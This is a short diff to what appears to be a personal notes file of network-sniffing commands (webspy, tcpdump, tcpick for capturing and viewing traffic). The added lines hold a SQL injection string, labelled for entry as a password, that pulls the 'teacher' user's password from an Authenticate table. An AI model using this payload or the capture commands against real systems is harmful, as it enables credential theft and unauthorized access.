@@ -10,4 +10,6 @@ webspy -i <interface>
 tcpdump -i <interface> -w <file> -s 0 tcp
 # use this to view the saved traffic
 tcpick -C -yP -r <file>
+# use this is the password todo sql injection
+'+(SELECT userPW FROM Authenticate WHERE userID='teacher')+'
 ```
